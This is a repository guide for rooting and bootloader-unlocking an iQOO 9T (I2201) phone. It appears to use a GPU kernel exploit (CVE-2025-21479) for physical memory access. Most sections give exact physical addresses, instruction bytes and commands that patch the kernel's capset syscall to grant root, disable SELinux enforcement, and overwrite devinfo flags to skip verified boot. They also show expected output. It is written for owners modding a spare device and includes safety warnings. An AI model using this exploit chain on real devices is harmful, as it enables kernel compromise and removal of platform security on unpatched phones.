# iQOO 9T (I2201 / vivo PD2217F) — Root & Bootloader Unlock Guide

**Device:** iQOO 9T, model `I2201`, vivo project `PD2217F_EX`, SoC Qualcomm
SM8475 (Snapdragon 8+ Gen 1, `taro`), Android 15.

**Result of this procedure:** bootloader **unlocked** (`ro.boot.flash.locked=0`,
`verifiedbootstate=orange`, `vbmeta.device_state=unlocked`), verified through
both Android and fastboot.

**Time:** ~30–60 minutes, most of it downloading the Android NDK.

**Risk:** this writes the `devinfo` partition and wipes userdata. It worked on
this exact firmware, but a mistake can leave the phone in vivo's repair menu or
worse. Use a spare device you can afford to lose. Read §11 before you start.

---

## Table of contents

1. [How it works](#1-how-it-works)
2. [Repository layout](#2-repository-layout)
3. [Host requirements](#3-host-requirements)
4. [Build the device payloads](#4-build-the-device-payloads)
5. [Prepare the phone](#5-prepare-the-phone)
6. [Confirm the exploit surface](#6-confirm-the-exploit-surface)
7. [Temporary root](#7-temporary-root)
8. [Unlock the bootloader](#8-unlock-the-bootloader)
9. [Verify the unlock](#9-verify-the-unlock)
10. [After the unlock: Magisk and Linux](#10-after-the-unlock-magisk-and-linux)
11. [Safety rules](#11-safety-rules)
12. [Troubleshooting](#12-troubleshooting)
13. [Build-specific constants](#13-build-specific-constants)
14. [Command cheat sheet](#14-command-cheat-sheet)

---

## 1. How it works

Two independent mechanisms are used:

1. **Temporary kernel root** via **CVE-2025-21479** (Adreno/KGSL). The GPU's
   SMMU TTBR0 is pointed at a page table we control, giving arbitrary physical
   memory read/write. We use it to patch three instructions at
   `__do_sys_capset` so that `capset(NULL, NULL)` runs
   `commit_creds(&init_cred)`.
2. **Bootloader unlock** by overwriting the ABL's trusted `devinfo` flags.
   On this ABL the valid-magic path does no CRC and no signature check:

   ```
   is_device_unlocked()          = devinfo[0x0d] != 0
   is_device_critical_unlocked() = devinfo[0x0e] != 0
   ```

Root is needed because the `devinfo` block device is root-only. Root is
temporary (cleared by reboot), but the `devinfo` change is persistent.

The official `fastboot flashing unlock` token is *not* used — it is RSA-signed
by vivo's server and cannot be forged. We change the bootloader's trust
decision instead.

### Why the phone shows "device is corrupt" after the write

Changing verified boot from locked/green to unlocked/orange invalidates the
existing userdata. A normal OEM unlock wipes data as part of the unlock; we
skipped that step. The recovery menu is offering the missing wipe. Choosing
**Clear all data** completes the unlock. This is expected, not a brick.

---

## 2. Repository layout

```
phone/
├── README.md                  ← index
├── docs/
│   ├── guide.md               ← this file
│   ├── findings.md            ← full technical recon (read-only phase + RE notes)
│   └── img/
│       └── bootloader_unlocked.png
├── tools/
│   ├── build.sh               ← cross-compile; auto-downloads NDK if needed
│   ├── device/                ← on-device C payloads
│   │   ├── cheese_pa.c        (vendored, GPL-3.0)
│   │   ├── pa_leak.{c,h}
│   │   ├── adrenaline.h
│   │   ├── kallsyms_lookup.c
│   │   ├── rootcmd.c
│   │   ├── capset_min.c
│   │   └── devinfo_unlock.c
│   ├── host/                  ← Python control scripts
│   │   ├── iqoo9t.py
│   │   ├── rootctl.py
│   │   ├── poke.py
│   │   ├── selinux.py
│   │   ├── write_words.py
│   │   └── pull-stock-boot.sh
│   └── out/                   ← build output (git-ignored)
├── firmware/README.md         ← where to get boot.img (images are not stored)
├── artifacts/                 ← backups + stock/patched boot images (git-ignored)
└── .gitignore
```

---

## 3. Host requirements

### 3.1 Packages

```bash
# Debian/Ubuntu
sudo apt install android-tools-adb android-tools-fastboot python3 curl unzip

# optional but recommended (used automatically if present)
sudo apt install aria2
```

Check:

```bash
adb version
fastboot --version
python3 --version
```

### 3.2 A `udev` rule (Linux, if the phone is not detected)

```bash
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="2d95", MODE="0666", GROUP="plugdev"' \
  | sudo tee /etc/udev/rules.d/51-android-vivo.rules
sudo udevadm control --reload-rules && sudo udevadm trigger
```

`2d95` is vivo's USB vendor ID.

### 3.3 Set the serial (only needed with multiple devices)

```bash
export IQOO_SERIAL=15903686880004Q
```

---

## 4. Build the device payloads

```bash
cd phone

# Uses $ANDROID_NDK_HOME / $NDK if set; otherwise downloads NDK r29
# (~700 MB) into tools/.toolchain/.
tools/build.sh

# chmod +x
chmod +x tools/build.sh tools/host/*.py tools/host/*.sh
```

Expected output in `tools/out/`:

```
cheese_pa
rootcmd
capset_min
devinfo_unlock
```

Push them to the phone (the phone must already be in Android with USB
debugging enabled — see §5):

```bash
tools/host/rootctl.py install
```

This copies the four binaries to `/data/local/tmp/` and `chmod 755`s them.

> **One GPU operation per process.** `cheese_pa` must be a fresh process for
> every read or write. The Python helpers already do this. Do not add loops
> that call it repeatedly in one process.

---

## 5. Prepare the phone

1. Boot Android and finish/skip the setup wizard. You do **not** need an
   account, but you do need the launcher.
2. **Settings → About phone → Build number** — tap 7 times.
3. **Settings → System → Developer options → USB debugging** — enable.
4. Connect USB. Accept the "Allow USB debugging?" prompt (check "always").
5. Verify:

```bash
adb devices
# 15903686880004Q   device

adb shell getprop ro.product.model          # I2201
adb shell getprop ro.build.version.release  # 15
adb shell getprop ro.build.display.id
```

> **Build check.** The physical addresses in this repo are for firmware
> `15.3.19.3.W30.V000L1` with kernel
> `5.10.233-android12-9-00001-g3f8134695cb5-ab13232202` (see §13). If your build differs, the
> exploit still applies but the addresses must be re-derived (see
> `docs/findings.md` §11–§14). Do not skip this check.

---

## 6. Confirm the exploit surface

From a normal `adb shell`, without root:

```bash
adb shell getprop ro.vendor.build.security_patch
# 2025-03-05     ← before the June-2025 Qualcomm bulletin

adb shell cat /proc/sys/kernel/perf_event_paranoid
# -1             ← the PA leak needs this

adb shell getconf PAGE_SIZE
# 4096
```

The GPU device node must be accessible to `shell`:

```bash
adb shell ls -l /dev/kgsl-3d0
```

Now run the primitive's self-test (it leaks the physical address of a page it
owns and reads a magic value back through the GPU):

```bash
tools/host/rootctl.py selftest
# selftest : PASS
```

If this fails, stop. Nothing later will work.

---

## 7. Temporary root

Root is per-boot. A reboot clears it and SELinux returns to Enforcing.

### 7.1 What `arm` writes

| Address (physical) | Value | Meaning |
|---|---|---|
| `0xA8145E38` | `0xF0013340` | `adrp x0, init_cred_page` |
| `0xA8145E3C` | `0x91298000` | `add x0, x0, #0xa60` |
| `0xA8145E40` | `0x1400FFE9` | `b commit_creds` |
| `0xAA7B0A60` | `0x7FFFFFFF` | `init_cred.usage` (refcount) |
| `0xAAA42B90` | `0x01010000` | `selinux_state.enforcing = 0` |

Why each one:

* The three instructions replace the entry of `__do_sys_capset` with a tail
  call that installs `init_cred`. The pristine entry is
  `0xD503233F 0xD10203FF 0xF800865E`.
* `commit_creds()` **does not take a reference** to its argument. Every
  `capset` + process exit decrements the global `init_cred.usage`, which starts
  at 4. After ~4 triggers the kernel frees `init_cred` and the phone reboots.
  Inflating the refcount prevents that. This was originally misdiagnosed as
  "vivo anti-root".
* A process carrying `init_cred` has SELinux SID `u:r:kernel:s0`. Under
  Enforcing it is killed as soon as it `exec`s. Permissive is required for the
  `rootcmd`/`sh` step.

### 7.2 Arm

```bash
tools/host/rootctl.py arm
```

Expected:

```
[*] writing __do_sys_capset tail call
    [0] 0xf0013340 -> 0xa8145e38
    [1] 0x91298000 -> 0xa8145e3c
    [2] 0x1400ffe9 -> 0xa8145e40
[*] inflating init_cred.usage ...
[*] setting SELinux Permissive
[+] patch state: armed, getenforce=Permissive
```

Status at any time:

```bash
tools/host/rootctl.py status
tools/host/rootctl.py status --no-gpu    # avoids the GPU reads
```

### 7.3 Verify root

```bash
tools/host/rootctl.py su id
# uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0

tools/host/capset_min    # or: adb shell /data/local/tmp/capset_min
```

`capset_min` does not exec, so it survives even in awkward states.

### 7.4 Using root

```bash
tools/host/rootctl.py su 'cat /proc/kallsyms | head'
tools/host/rootctl.py su 'ls /data/data | head'
```

For **binder clients** (`pm`, `am`, `cmd`), stay uid 0 but switch to the shell
SELinux domain:

```bash
tools/host/rootctl.py su --shell-domain 'pm list packages | head'
```

Without that, the kernel domain has no binder access and you get
`Can't find service: package`.

### 7.5 Disarm

```bash
tools/host/rootctl.py disarm
```

Restores the three original instructions and sets SELinux back to Enforcing.
A reboot does the same thing.

---

## 8. Unlock the bootloader

This is the persistent step. Root must be armed and SELinux Permissive.

### 8.1 Back up `devinfo` first

```bash
tools/host/rootctl.py devinfo status
```

Example:

```
devinfo      : /dev/block/by-name/devinfo
magic        : ANDROID-BOOT!
is_unlocked  : 0x00  (0x0d)
is_critical  : 0x00  (0x0e)
charger_scr  : 0x01  (0x0f)
byte 0x90    : 0x01
```

The `devinfo_unlock` payload saves the pristine 4096 bytes to
`/data/local/tmp/devinfo_before.img` the first time it writes. Pull it:

```bash
tools/host/rootctl.py backup-devinfo
# saved artifacts/devinfo_before.img
```

Keep that file. It is the only easy way back to a locked state.

### 8.2 Write the unlock flags

```bash
tools/host/rootctl.py devinfo unlock
```

Expected:

```
--- after ---
is_unlocked  : 0x01  (0x0d)
is_critical  : 0x01  (0x0e)
...
devinfo_unlock: unlock OK
```

### 8.3 Reboot into the repair screen

```bash
adb reboot
```

The phone will:

1. show the **"bootloader is unlocked"** warning,
2. show the boot logo,
3. land on the vivo repair menu:

   > **device is corrupt**
   > Repair system · **Clear all data** · Restart · Power off

Choose **Clear all data** and confirm. Do **not** choose **Repair system** —
vivo's repair path may re-flash and re-lock the bootloader.

The wipe is the missing half of the unlock and is required anyway. The phone
reboots into a fresh Android setup.

> If the phone does not enumerate on USB at the repair screen, that is normal.
> Use the volume keys to select the menu entry and the power button to confirm.

### 8.4 What just happened

* `devinfo[0x0d]=1` made the ABL skip boot verification.
* `devinfo[0x0e]=1` marks the critical unlock.
* The un-wiped userdata failed to boot against the new verified-boot state, so
  the recovery offered the wipe.
* After the wipe, Android boots with `verifiedbootstate=orange`.

---

## 9. Verify the unlock

Complete the setup wizard far enough to reach the launcher, then re-enable USB
debugging (§5).

### 9.1 From Android

```bash
tools/host/rootctl.py verify
```

or directly:

```bash
adb shell getprop ro.boot.flash.locked          # 0
adb shell getprop ro.boot.verifiedbootstate     # orange
adb shell getprop ro.boot.vbmeta.device_state   # unlocked
adb shell getprop ro.boot.secureboot_enable     # 1 (secure boot still on)
```

### 9.2 From fastboot

```bash
adb reboot bootloader
fastboot devices
# 15903686880004Q   fastboot

fastboot getvar unlocked
# unlocked: yes

fastboot getvar product
# product: taro

fastboot getvar max-download-size
# max-download-size: 805306368
```

`fastboot getvar current-slot` returns
`FAILED (remote: 'GetVar Variable Not found')` on this ABL — that is normal, not
an error.

Return to Android:

```bash
fastboot reboot
```

**Success criterion:** all three of `flash.locked=0`, `verifiedbootstate=orange`,
`vbmeta.device_state=unlocked`. These come from the bootloader's
`androidboot.*` command line and cannot be faked by the OS.

---

## 10. After the unlock: Magisk and Linux

### 10.1 Magisk

The bootloader is unlocked, so a patched boot image will boot.

**Step 1 — get the stock image that matches the installed build.** Preferred:
dump it from the phone (requires re-arming root, because the unlock wiped
Android):

```bash
tools/host/rootctl.py arm
tools/host/pull-stock-boot.sh
# artifacts/boot_a.img, and init_boot_a.img if present
tools/host/rootctl.py disarm
```

If you cannot root, extract `boot.img` from the matching firmware package (see
`firmware/README.md`).

**Step 2 — patch it.** Install the Magisk app, then
*Install → Select and Patch a File*, choose the stock image, and pull the
result:

```bash
adb pull /sdcard/Download/magisk_patched-*.img artifacts/
```

Patch `init_boot` if the phone has one (Android 13+ often does); otherwise
patch `boot`. Magisk decides this from the image, and so should you.

**Step 3 — flash.**

```bash
adb reboot bootloader

# use the partition that exists on your device:
fastboot flash init_boot artifacts/magisk_patched-*.img
# or
fastboot flash boot artifacts/magisk_patched-*.img

fastboot reboot
```

Keep the untouched stock image in `artifacts/`; that is your restore path:

```bash
fastboot flash boot artifacts/boot_a.img
```

> `fastboot flash boot ...` (no slot suffix) flashes the active slot on this
> ABL. If it complains, try `boot_a` / `init_boot_a` explicitly.

### 10.2 Linux

Unlocking is the prerequisite, not the whole job. SM8475 has mainline and
postmarketOS work, but there is **no turnkey iQOO 9T port**. A realistic plan:

1. Build or obtain an SM8475 mainline kernel with a device tree for
   `PD2217F`/`taro`.
2. Package it as an Android boot image (`boot.img`) with an initramfs that
   mounts your rootfs.
3. Flash the kernel to `boot` and put the rootfs on `userdata` (or a dedicated
   partition), then boot with `fastboot boot` first to test.
4. Keep the stock boot image to get back to Android.

`fastboot boot <image>` is the safe first test — it does not write anything.

**Never flash** `abl`, `xbl`, `tz`, `hyp`, `keymint`, or `uefi`. Secure boot is
still enabled (`secureboot_enable=1`, key `qcom_mobile` v6) and the PBL
verifies the boot chain; an unsigned replacement is a hard brick.

---

## 11. Safety rules

1. **Do not flash the boot chain.** `abl`, `xbl`, `tz`, `hyp`, `keymint`,
   `uefi`. The unlock only removes Android's verified-boot check; it does not
   disable Qualcomm secure boot.
2. **Do not run `Repair system`** in the recovery menu if you want to keep the
   unlock.
3. **Keep `artifacts/devinfo_before.img`.** To re-lock, restore both bytes to 0.
   Re-locking normally also requires a wipe.
4. **Do not burst the GPU primitive.** Arming is ~5 writes. Long loops can
   reboot the phone (`gpu fault threshold exceeded`).
5. **A reboot clears root.** Re-run `rootctl.py arm` after every boot.
6. **Unlocking wipes data and changes the security model.** Banking/DRM apps
   may refuse to run. That is expected with `verifiedbootstate=orange`.

---

## 12. Troubleshooting

### "device is corrupt" / repair menu

Expected after the devinfo write. Select **Clear all data**. If it loops:

* Make sure you are not selecting *Repair system*.
* Re-select *Clear all data* and let it finish; it may reboot more than once.
* If USB never enumerates, that is normal at this screen — use the volume
  keys + power button.

### `adb devices` is empty

* Re-plug the cable; use a data cable, not charge-only.
* Accept the debugging prompt on the phone.
* `adb kill-server && adb start-server`.
* Check the udev rule (§3.2).

### `adb devices` says `unauthorized`

Revoke USB debugging authorizations in Developer options, replug, accept again.

### `rootctl.py selftest` fails

* `perf_event_paranoid` must be `-1`.
* The GPU must be idle; close games/camera.
* Retry once. If it still fails, the SMB/SMMU race was lost — reboot and try
  again.

### `rootctl.py su id` says "not root"

* `rootctl.py status` should say `patch state: armed`.
* If it says `original`, re-run `arm`.
* If `arm` failed partway, run `disarm`, reboot, and retry.

### Device reboots while arming

The `init_cred.usage` write must land. If a write fails, `disarm` (best effort),
reboot, and re-arm. Do not repeatedly trigger `capset` against a partially
patched kernel.

### The phone will not enter fastboot

* From Android: `adb reboot bootloader`.
* From off: hold **Volume Down**, then press **Power**. On this ABL the
  unlocked warning may appear first; keep holding until fastboot.
* Fastboot is not exposed at the "device is corrupt" recovery screen; resolve
  the wipe first.

### Recovery / EDL notes

The flash package for this device contains **no** `prog_firehose_ddr.elf`, and
vivo's EDL path is authenticated. Do not count on 9008 recovery. Treat the
`boot`/`init_boot`/`devinfo` backups as the real safety net.

---

## 13. Build-specific constants

Firmware **15.3.19.3.W30.V000L1**, kernel
`5.10.233-android12-9-00001-g3f8134695cb5-ab13232202`.

| Symbol | Virtual | Physical |
|---|---|---|
| `_text` | `0xffffffc008000000` | `0xA8000000` |
| `__do_sys_capset` | — | `0xA8145E38` |
| `init_cred` | `0xffffffc00a7b0a60` | `0xAA7B0A60` |
| `init_task.cred` | — | `0xAA79C600` |
| `init_task.real_cred` | — | `0xAA79C5F8` |
| `selinux_state` | — | `0xAAA42B90` |

`selinux_state.enforcing`: `0x01010001` = Enforcing, `0x01010000` = Permissive.

`devinfo` (`/dev/block/by-name/devinfo`, 4096 bytes):

| Offset | Field |
|---|---|
| `0x00` | magic `"ANDROID-BOOT!"` |
| `0x0d` | `is_unlocked` |
| `0x0e` | `is_unlock_critical` |
| `0x0f` | `is_charger_screen_enabled` |

If your kernel build differs, re-derive these addresses from the stock
`boot.img` — the method is documented in `docs/findings.md`.

---

## 14. Command cheat sheet

```bash
# build + install
tools/build.sh
tools/host/rootctl.py install

# verify unlock (no root needed)
tools/host/rootctl.py verify

# temporary root
tools/host/rootctl.py selftest
tools/host/rootctl.py arm
tools/host/rootctl.py su id
tools/host/rootctl.py su --shell-domain 'pm list packages'
tools/host/rootctl.py disarm

# unlock (once)
tools/host/rootctl.py devinfo status
tools/host/rootctl.py devinfo unlock
tools/host/rootctl.py backup-devinfo
adb reboot            # then choose "Clear all data"

# verify
adb shell getprop ro.boot.flash.locked        # 0
adb shell getprop ro.boot.verifiedbootstate   # orange
fastboot getvar unlocked                      # unlocked: yes

# Magisk prep
tools/host/rootctl.py arm
tools/host/pull-stock-boot.sh

# raw physical access (debugging)
tools/host/poke.py read  0xA8145E38
tools/host/poke.py write 0xAA7B0A60 0x7FFFFFFF
tools/host/selinux.py status
```

---

*Technical background, ABL disassembly notes, exploit derivation, and the
original reconnaissance are in [`docs/findings.md`](findings.md).*
